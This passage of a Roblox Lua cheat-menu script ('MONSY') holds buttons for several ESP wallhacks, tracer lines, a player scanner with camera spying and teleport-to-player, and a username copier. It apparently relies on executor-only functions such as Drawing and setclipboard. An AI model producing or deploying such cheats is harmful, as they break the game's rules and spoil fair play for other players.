		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("PLAYER SCANNER (MONSY)", function()
	--// PUBLIC ENEMY PLAYER SCANNER
-- Solid black GUI + Modern font + Hover effects + Click animations + Working VIEW/UNVIEW/TELEPORT

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 400)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- UI Corner
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "PUBLIC ENEMY PLAYER SCANNER"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 20
Title.Parent = MainFrame

-- Scan Button
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0.9, 0, 0, 35)
ScanButton.Position = UDim2.new(0.05, 0, 0, 50)
ScanButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
ScanButton.TextColor3 = Color3.fromRGB(0,0,0)
ScanButton.Font = Enum.Font.Roboto
ScanButton.TextSize = 18
ScanButton.Text = "SCAN"
ScanButton.AutoButtonColor = false
ScanButton.Parent = MainFrame

local ScanCorner = Instance.new("UICorner")
ScanCorner.CornerRadius = UDim.new(0, 6)
ScanCorner.Parent = ScanButton

-- Hover effect
local function AddHoverEffect(button)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
	button.MouseButton1Click:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		task.wait(0.1)
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
end
AddHoverEffect(ScanButton)

-- Scrollable Player List
local PlayerListFrame = Instance.new("ScrollingFrame")
PlayerListFrame.Size = UDim2.new(0.9, 0, 0, 280)
PlayerListFrame.Position = UDim2.new(0.05, 0, 0, 90)
PlayerListFrame.BackgroundTransparency = 1
PlayerListFrame.BorderSizePixel = 0
PlayerListFrame.ScrollBarThickness = 6
PlayerListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
PlayerListFrame.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = PlayerListFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

-- Function to create each player entry
local function CreatePlayerButton(player)
	local PlayerButton = Instance.new("TextButton")
	PlayerButton.Size = UDim2.new(1, 0, 0, 30)
	PlayerButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	PlayerButton.TextColor3 = Color3.fromRGB(0,0,0)
	PlayerButton.Font = Enum.Font.Roboto
	PlayerButton.TextSize = 16
	PlayerButton.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	PlayerButton.AutoButtonColor = false
	PlayerButton.Parent = PlayerListFrame

	local PlayerCorner = Instance.new("UICorner")
	PlayerCorner.CornerRadius = UDim.new(0, 6)
	PlayerCorner.Parent = PlayerButton

	AddHoverEffect(PlayerButton)

	-- Actions Frame
	local ActionsFrame = Instance.new("Frame")
	ActionsFrame.Size = UDim2.new(1, 0, 0, 30)
	ActionsFrame.BackgroundTransparency = 1
	ActionsFrame.Visible = false
	ActionsFrame.Parent = PlayerListFrame

	local function CreateActionButton(text)
		local Btn = Instance.new("TextButton")
		Btn.Size = UDim2.new(0.3, 0, 1, 0)
		Btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
		Btn.TextColor3 = Color3.fromRGB(0,0,0)
		Btn.Font = Enum.Font.Roboto
		Btn.TextSize = 14
		Btn.Text = text
		Btn.AutoButtonColor = false
		Btn.Parent = ActionsFrame

		local BtnCorner = Instance.new("UICorner")
		BtnCorner.CornerRadius = UDim.new(0, 6)
		BtnCorner.Parent = Btn

		AddHoverEffect(Btn)
		return Btn
	end

	local ViewBtn = CreateActionButton("VIEW")
	local UnviewBtn = CreateActionButton("UNVIEW")
	local TeleportBtn = CreateActionButton("TELEPORT")

	ViewBtn.Position = UDim2.new(0, 0, 0, 0)
	UnviewBtn.Position = UDim2.new(0.35, 0, 0, 0)
	TeleportBtn.Position = UDim2.new(0.7, 0, 0, 0)

	-- === BUTTON FUNCTIONS ===
	ViewBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("Head") then
			workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChild("Head")
		end
	end)

	UnviewBtn.MouseButton1Click:Connect(function()
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
		end
	end)

	TeleportBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
		   LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame =
				player.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
		end
	end)

	-- Show/hide action buttons
	PlayerButton.MouseButton1Click:Connect(function()
		ActionsFrame.Visible = not ActionsFrame.Visible
	end)
end

-- SCAN function
ScanButton.MouseButton1Click:Connect(function()
	for _, child in ipairs(PlayerListFrame:GetChildren()) do
		if child:IsA("TextButton") or child:IsA("Frame") then
			child:Destroy()
		end
	end

	task.spawn(function()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				CreatePlayerButton(player)
				task.wait(0.15)
			end
		end
	end)
end)

-- Hide/Unhide with U
UIS.InputBegan:Connect(function(input, gp)
	if not gp and input.KeyCode == Enum.KeyCode.U then
		MainFrame.Visible = not MainFrame.Visible
	end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("ESP STROKE WHITE MUSCLE E TO ON/OFF (NEW)", function()
	local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local espEnabled = true

local TAG_NAME = "MONSY_TAG"
local HL_NAME = "MONSY_ESP"

local function ensureESP(char)
	if not char or char:FindFirstChild(HL_NAME) then return end

	local hl = Instance.new("Highlight")
	hl.Name = HL_NAME
	hl.Adornee = char
	hl.FillTransparency = 1
	hl.OutlineColor = Color3.new(1, 1, 1)
	hl.OutlineTransparency = 0
	hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	hl.Parent = char
end

local function ensureTag(char)
	if not char then return end
	local head = char:FindFirstChild("Head")
	if not head then return end
	if head:FindFirstChild(TAG_NAME) then return end

	local bb = Instance.new("BillboardGui")
	bb.Name = TAG_NAME
	bb.Adornee = head
	bb.Size = UDim2.new(0, 40, 0, 20) -- mas maliit
	bb.StudsOffset = Vector3.new(0, 2.2, 0)
	bb.AlwaysOnTop = true
	bb.Parent = head

	local tl = Instance.new("TextLabel")
	tl.BackgroundTransparency = 1
	tl.Size = UDim2.new(1, 0, 1, 0)
	tl.Text = "x"
	tl.TextColor3 = Color3.new(1, 1, 1)
	tl.TextStrokeTransparency = 0
	tl.TextScaled = false
	tl.TextSize = 14 -- ✅ liliit/lalaki dito (try 12-16)
	tl.Font = Enum.Font.Roboto
	tl.Parent = bb
end


local function removeESP(char)
	local hl = char and char:FindFirstChild(HL_NAME)
	if hl then hl:Destroy() end
end

local function removeTag(char)
	if not char then return end
	local head = char:FindFirstChild("Head")
	if not head then return end
	local bb = head:FindFirstChild(TAG_NAME)
	if bb then bb:Destroy() end
end

local function applyForPlayer(plr)
	if plr == LocalPlayer then return end
	local char = plr.Character
	if not char then return end

	-- wait for head to exist
	char:WaitForChild("Head", 5)

	if espEnabled then
		ensureESP(char)
		ensureTag(char)
	else
		removeESP(char)
		removeTag(char)
	end
end

local function hookPlayer(plr)
	if plr == LocalPlayer then return end

	if plr.Character then
		applyForPlayer(plr)
	end

	plr.CharacterAdded:Connect(function()
		task.wait(0.15)
		applyForPlayer(plr)
	end)
end

local function refreshAll()
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			applyForPlayer(plr)
		end
	end
end

-- Hook players
for _, plr in ipairs(Players:GetPlayers()) do
	hookPlayer(plr)
end
Players.PlayerAdded:Connect(hookPlayer)
Players.PlayerRemoving:Connect(function(plr)
	if plr ~= LocalPlayer and plr.Character then
		removeESP(plr.Character)
		removeTag(plr.Character)
	end
end)

-- Keybind: E toggle
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.E then
		espEnabled = not espEnabled
		refreshAll()
		warn("ESP+TAG:", espEnabled and "ON" or "OFF")
	end
end)

-- initial apply
refreshAll()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("USERNAME COPIER (MONSY)", function()
	-- Sleek Black Player Scanner GUI (Medium Version with Smooth Refresh Animation)
-- All-black draggable GUI listing player usernames. Click to copy username.
-- Use 'M' key to toggle visibility.

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Main frame (medium black window)
local mainFrame = Instance.new("Frame")
mainFrame.Name = ""
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.Size = UDim2.new(0, 300, 0, 340)
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui
mainFrame.Active = true
mainFrame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = mainFrame

-- Title
local title = Instance.new("TextLabel")
title.Name = ""
title.Size = UDim2.new(1, 0, 0, 34)
title.BackgroundTransparency = 1
title.Text = "USERNAME COPIER"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = mainFrame

-- Close button
local closeBtn = Instance.new("TextButton")
closeBtn.Name = ""
closeBtn.Size = UDim2.new(0, 26, 0, 26)
closeBtn.Position = UDim2.new(1, -32, 0, 4)
closeBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
closeBtn.BorderSizePixel = 0
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(0,0,0)
closeBtn.Font = Enum.Font.Roboto
closeBtn.TextSize = 16
closeBtn.Parent = mainFrame
closeBtn.MouseButton1Click:Connect(function()
	screenGui.Enabled = false
end)

-- Refresh Button
local refreshBtn = Instance.new("TextButton")
refreshBtn.Name = ""
refreshBtn.Size = UDim2.new(0, 100, 0, 28)
refreshBtn.Position = UDim2.new(0, 8, 0, 40)
refreshBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
refreshBtn.BorderSizePixel = 1
refreshBtn.BorderColor3 = Color3.fromRGB(25, 25, 25)
refreshBtn.Text = "REFRESH"
refreshBtn.TextColor3 = Color3.fromRGB(0,0,0)
refreshBtn.Font = Enum.Font.Roboto
refreshBtn.TextSize = 13
refreshBtn.Parent = mainFrame

local refreshCorner = Instance.new("UICorner")
refreshCorner.CornerRadius = UDim.new(0, 6)
refreshCorner.Parent = refreshBtn

-- Scrolling player list
local scroll = Instance.new("ScrollingFrame")
scroll.Name = ""
scroll.Position = UDim2.new(0, 8, 0, 74)
scroll.Size = UDim2.new(1, -16, 1, -82)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 4
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.Parent = mainFrame

local uiList = Instance.new("UIListLayout")
uiList.Padding = UDim.new(0, 5)
uiList.SortOrder = Enum.SortOrder.LayoutOrder
uiList.Parent = scroll

local uiPadding = Instance.new("UIPadding")
uiPadding.PaddingTop = UDim.new(0, 6)
uiPadding.PaddingLeft = UDim.new(0, 6)
uiPadding.PaddingRight = UDim.new(0, 6)
uiPadding.PaddingBottom = UDim.new(0, 6)
uiPadding.Parent = scroll

-- Notification helper
local function notify(titleText, text)
	pcall(function()
		StarterGui:SetCore("SendNotification", {
			Title = titleText or "Notice",
			Text = text or "",
			Duration = 2
		})
	end)
end

-- Create player button
local function makePlayerButton(plr)
	local btn = Instance.new("TextButton")
	btn.Name = plr.Name
	btn.Size = UDim2.new(1, -4, 0, 28)
	btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
	btn.BorderSizePixel = 1
	btn.BorderColor3 = Color3.fromRGB(25, 25, 25)
	btn.Text = plr.Name
	btn.TextColor3 = Color3.fromRGB(0,0,0)
	btn.Font = Enum.Font.Roboto
	btn.TextSize = 15
	btn.BackgroundTransparency = 1
	btn.TextTransparency = 1
	btn.Parent = scroll

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 6)
	corner.Parent = btn

	TweenService:Create(btn, TweenInfo.new(0.25), {BackgroundTransparency = 0, TextTransparency = 0}):Play()

	btn.MouseButton1Click:Connect(function()
		local username = plr.Name
		local success, err = pcall(function()
			if setclipboard then
				setclipboard(username)
				notify("Copied", username .. " copied!")
			else
				error("no setclipboard")
			end
		end)
		if not success then
			notify("Manual Copy", username .. " (setclipboard not supported)")
		end
	end)
end

-- Smooth refresh with fade effect
local function refreshList()
	-- Fade out existing buttons
	for _, child in ipairs(scroll:GetChildren()) do
		if child:IsA("TextButton") then
			TweenService:Create(child, TweenInfo.new(0.15), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
		end
	end
	task.wait(0.15)

	-- Clear old buttons
	for _, child in ipairs(scroll:GetChildren()) do
		if child:IsA("TextButton") then child:Destroy() end
	end

	-- Add new player buttons
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			makePlayerButton(plr)
		end
	end

	local total = #Players:GetPlayers() * 32
	scroll.CanvasSize = UDim2.new(0, 0, 0, total)
	notify("Refreshed", "Player list updated")
end

refreshBtn.MouseButton1Click:Connect(refreshList)
Players.PlayerAdded:Connect(refreshList)
Players.PlayerRemoving:Connect(refreshList)
refreshList()

-- Toggle with M key
local UIS = game:GetService("UserInputService")
UIS.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.M then
		screenGui.Enabled = not screenGui.Enabled
	end
end)

screenGui.Enabled = true
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("TRACK ALL MUSCLE T TO OPEN / OFF (MONSY)", function()
  --// Player Tracker + NameTag Display | Toggle with T key (FINAL FIXED VERSION)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

repeat wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

local trackingEnabled = false
local lines = {}
local nameTags = {}
local connections = {}
local renderConnection

-- Clean ESP for a single player
local function removeESP(player)
	if lines[player] then
		lines[player]:Destroy()
		lines[player] = nil
	end
	if nameTags[player] then
		nameTags[player]:Destroy()
		nameTags[player] = nil
	end
end

-- Create ESP for a player
local function createESP(player)
	if player == LocalPlayer then return end

	local function setup()
		removeESP(player)

		local character = player.Character
		if not character then return end

		local hrp = character:FindFirstChild("HumanoidRootPart")
		local head = character:FindFirstChild("Head")
		if not hrp or not head then return end

		-- Line
		local line = Instance.new("Part")
		line.Anchored = true
		line.CanCollide = false
		line.Color = Color3.new(1, 1, 1)
		line.Material = Enum.Material.Neon
		line.Transparency = 0
		line.Size = Vector3.new(0.1, 0.1, 1)
		line.Name = "" .. player.Name
		line.Parent = workspace
		lines[player] = line

		-- NameTag
		local billboard = Instance.new("BillboardGui")
		billboard.Name = ""
		billboard.Size = UDim2.new(0, 100, 0, 30)
		billboard.StudsOffset = Vector3.new(0, 2.2, 0)
		billboard.AlwaysOnTop = true
		billboard.Adornee = head

		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, 0, 1, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = player.DisplayName .. "\n(" .. player.Name .. ")"
		textLabel.TextColor3 = Color3.new(1, 1, 1)
		textLabel.TextStrokeTransparency = 0.4
		textLabel.Font = Enum.Font.Roboto
		textLabel.TextScaled = true
		textLabel.Parent = billboard

		billboard.Parent = head
		nameTags[player] = billboard
	end

	if player.Character then
		setup()
	end

	local conn = player.CharacterAdded:Connect(function()
		wait(1)
		setup()
	end)
	table.insert(connections, conn)
end

-- Update all lines every frame
local function updateESP()
	local origin = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not origin then return end

	for player, line in pairs(lines) do
		local target = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
		if target and target:IsDescendantOf(workspace) then
			local direction = target.Position - origin.Position
			local distance = direction.Magnitude
			line.Size = Vector3.new(0.1, 0.1, distance)
			line.CFrame = CFrame.new(origin.Position, target.Position) * CFrame.new(0, 0, -distance / 2)
		else
			-- Remove broken line
			removeESP(player)
		end
	end
end

-- Clear everything
local function clearESP()
	for _, line in pairs(lines) do
		if line then line:Destroy() end
	end
	for _, tag in pairs(nameTags) do
		if tag then tag:Destroy() end
	end
	for _, conn in ipairs(connections) do
		if conn then conn:Disconnect() end
	end
	if renderConnection then
		renderConnection:Disconnect()
	end

	lines = {}
	nameTags = {}
	connections = {}
	renderConnection = nil
end

-- Toggle ESP
local function toggleESP()
	trackingEnabled = not trackingEnabled

	if trackingEnabled then
		warn("📡 ESP ON")

		for _, player in ipairs(Players:GetPlayers()) do
			createESP(player)
		end

		local playerAddedConn = Players.PlayerAdded:Connect(function(player)
			createESP(player)
		end)
		table.insert(connections, playerAddedConn)

		renderConnection = RunService.RenderStepped:Connect(updateESP)
	else
		warn("📴 ESP OFF")
		clearESP()
	end
end

-- Keybind (T)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.T then
		toggleESP()
	end
end)

warn("🔁 Press [T] to toggle Player Tracker with Clean ESP.")
end)

addMainMenuButton("ESP (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 100, 0, 35)
toggleButton.Position = UDim2.new(0, 20, 0, 120)
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.TextColor3 = Color3.fromRGB(0,0,0)
toggleButton.Text = "ESP: ON"
toggleButton.Font = Enum.Font.Roboto
toggleButton.TextSize = 14
toggleButton.Parent = gui

local corner = Instance.new("UICorner", toggleButton)
corner.CornerRadius = UDim.new(0, 6)

--// Toggle State
local ESP_ENABLED = true
local ESPObjects = {}

--// Drawing Helpers
local function newLine()
	local line = Drawing.new("Line")
	line.Thickness = 2
	line.Color = Color3.fromRGB(255, 255, 255) -- Changed to white
	line.Visible = true
	return line
end

local function newText()
	local text = Drawing.new("Text")
	text.Size = 14
	text.Color = Color3.fromRGB(255, 255, 255)
	text.Center = true
	text.Outline = true
	text.Visible = true
	return text
end

local function clearESP(player)
	if ESPObjects[player] then
		for _, obj in pairs(ESPObjects[player]) do
			if obj.Remove then obj:Remove() end
		end
		ESPObjects[player] = nil
	end
end

--// Get 2D screen position of 3D part
local function getPartPos(part)
	if not part then return nil, false end
	local pos, visible = Camera:WorldToViewportPoint(part.Position)
	return Vector2.new(pos.X, pos.Y), visible
end

--// ESP Rendering
RunService.RenderStepped:Connect(function()
	if not ESP_ENABLED then
		for _, v in pairs(ESPObjects) do
			for _, obj in pairs(v) do
				obj.Visible = false
			end
		end
		return
	end

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character then
			local char = player.Character
			local esp = ESPObjects[player]

			if not esp then
				esp = {
					HeadToTorso = newLine(),
					TorsoToLeftArm = newLine(),
					TorsoToRightArm = newLine(),
					TorsoToLeftLeg = newLine(),
					TorsoToRightLeg = newLine(),
					Name = newText(),
				}
				ESPObjects[player] = esp
			end

			local headPos, headVis = getPartPos(char:FindFirstChild("Head"))
			local torsoPos, torsoVis = getPartPos(char:FindFirstChild("HumanoidRootPart"))
			local laPos, laVis = getPartPos(char:FindFirstChild("LeftUpperArm") or char:FindFirstChild("Left Arm"))
			local raPos, raVis = getPartPos(char:FindFirstChild("RightUpperArm") or char:FindFirstChild("Right Arm"))
			local llPos, llVis = getPartPos(char:FindFirstChild("LeftUpperLeg") or char:FindFirstChild("Left Leg"))
			local rlPos, rlVis = getPartPos(char:FindFirstChild("RightUpperLeg") or char:FindFirstChild("Right Leg"))

			if headVis and torsoVis then
				esp.HeadToTorso.From = headPos
				esp.HeadToTorso.To = torsoPos
				esp.HeadToTorso.Visible = true
			else
				esp.HeadToTorso.Visible = false
			end

			if torsoVis and laVis then
				esp.TorsoToLeftArm.From = torsoPos
				esp.TorsoToLeftArm.To = laPos
				esp.TorsoToLeftArm.Visible = true
			else
				esp.TorsoToLeftArm.Visible = false
			end

			if torsoVis and raVis then
				esp.TorsoToRightArm.From = torsoPos
				esp.TorsoToRightArm.To = raPos
				esp.TorsoToRightArm.Visible = true
			else
				esp.TorsoToRightArm.Visible = false
			end

			if torsoVis and llVis then
				esp.TorsoToLeftLeg.From = torsoPos
				esp.TorsoToLeftLeg.To = llPos
				esp.TorsoToLeftLeg.Visible = true
			else
				esp.TorsoToLeftLeg.Visible = false
			end

			if torsoVis and rlVis then
				esp.TorsoToRightLeg.From = torsoPos
				esp.TorsoToRightLeg.To = rlPos
				esp.TorsoToRightLeg.Visible = true
			else
				esp.TorsoToRightLeg.Visible = false
			end

			if headVis then
				esp.Name.Position = Vector2.new(headPos.X, headPos.Y - 20)
				esp.Name.Text = player.Name
				esp.Name.Visible = true
			else
				esp.Name.Visible = false
			end
		end
	end
end)

--// Player leave cleanup
Players.PlayerRemoving:Connect(function(player)
	clearESP(player)
end)

--// Toggle Button
toggleButton.MouseButton1Click:Connect(function()
	ESP_ENABLED = not ESP_ENABLED
	toggleButton.Text = ESP_ENABLED and "ESP: ON" or "ESP: OFF"
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER SCANNER (MONSY)", function()
	--// PUBLIC ENEMY PLAYER SCANNER
-- Solid black GUI + Modern font + Hover effects + Click animations + Working VIEW/UNVIEW/TELEPORT

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 400)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- UI Corner
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "PUBLIC ENEMY PLAYER SCANNER"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 20
Title.Parent = MainFrame

-- Scan Button
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0.9, 0, 0, 35)
ScanButton.Position = UDim2.new(0.05, 0, 0, 50)
ScanButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
ScanButton.TextColor3 = Color3.fromRGB(0,0,0)
ScanButton.Font = Enum.Font.Roboto
ScanButton.TextSize = 18
ScanButton.Text = "SCAN"
ScanButton.AutoButtonColor = false
ScanButton.Parent = MainFrame

local ScanCorner = Instance.new("UICorner")
ScanCorner.CornerRadius = UDim.new(0, 6)
ScanCorner.Parent = ScanButton

-- Hover effect
local function AddHoverEffect(button)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
	button.MouseButton1Click:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		task.wait(0.1)
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
end
AddHoverEffect(ScanButton)

-- Scrollable Player List
local PlayerListFrame = Instance.new("ScrollingFrame")
PlayerListFrame.Size = UDim2.new(0.9, 0, 0, 280)
PlayerListFrame.Position = UDim2.new(0.05, 0, 0, 90)
PlayerListFrame.BackgroundTransparency = 1
PlayerListFrame.BorderSizePixel = 0
PlayerListFrame.ScrollBarThickness = 6
PlayerListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
PlayerListFrame.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = PlayerListFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

-- Function to create each player entry
local function CreatePlayerButton(player)
	local PlayerButton = Instance.new("TextButton")
	PlayerButton.Size = UDim2.new(1, 0, 0, 30)
	PlayerButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	PlayerButton.TextColor3 = Color3.fromRGB(0,0,0)
	PlayerButton.Font = Enum.Font.Roboto
	PlayerButton.TextSize = 16
	PlayerButton.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	PlayerButton.AutoButtonColor = false
	PlayerButton.Parent = PlayerListFrame

	local PlayerCorner = Instance.new("UICorner")
	PlayerCorner.CornerRadius = UDim.new(0, 6)
	PlayerCorner.Parent = PlayerButton

	AddHoverEffect(PlayerButton)

	-- Actions Frame
	local ActionsFrame = Instance.new("Frame")
	ActionsFrame.Size = UDim2.new(1, 0, 0, 30)
	ActionsFrame.BackgroundTransparency = 1
	ActionsFrame.Visible = false
	ActionsFrame.Parent = PlayerListFrame

	local function CreateActionButton(text)
		local Btn = Instance.new("TextButton")
		Btn.Size = UDim2.new(0.3, 0, 1, 0)
		Btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
		Btn.TextColor3 = Color3.fromRGB(0,0,0)
		Btn.Font = Enum.Font.Roboto
		Btn.TextSize = 14
		Btn.Text = text
		Btn.AutoButtonColor = false
		Btn.Parent = ActionsFrame

		local BtnCorner = Instance.new("UICorner")
		BtnCorner.CornerRadius = UDim.new(0, 6)
		BtnCorner.Parent = Btn

		AddHoverEffect(Btn)
		return Btn
	end

	local ViewBtn = CreateActionButton("VIEW")
	local UnviewBtn = CreateActionButton("UNVIEW")
	local TeleportBtn = CreateActionButton("TELEPORT")

	ViewBtn.Position = UDim2.new(0, 0, 0, 0)
	UnviewBtn.Position = UDim2.new(0.35, 0, 0, 0)
	TeleportBtn.Position = UDim2.new(0.7, 0, 0, 0)

	-- === BUTTON FUNCTIONS ===
	ViewBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("Head") then
			workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChild("Head")
		end
	end)

	UnviewBtn.MouseButton1Click:Connect(function()
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
		end
	end)

	TeleportBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
		   LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame =
				player.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
		end
	end)

	-- Show/hide action buttons
	PlayerButton.MouseButton1Click:Connect(function()
		ActionsFrame.Visible = not ActionsFrame.Visible
	end)
end

-- SCAN function
ScanButton.MouseButton1Click:Connect(function()
	for _, child in ipairs(PlayerListFrame:GetChildren()) do
		if child:IsA("TextButton") or child:IsA("Frame") then
			child:Destroy()
		end
	end

	task.spawn(function()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				CreatePlayerButton(player)
				task.wait(0.15)
			end
		end
	end)
end)

-- Hide/Unhide with U
UIS.InputBegan:Connect(function(input, gp)
	if not gp and input.KeyCode == Enum.KeyCode.U then
		MainFrame.Visible = not MainFrame.Visible
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER LIST TP (MONSY)", function()
	-- PUBLIC ENEMY - Player Viewer (LocalScript sa StarterGui)
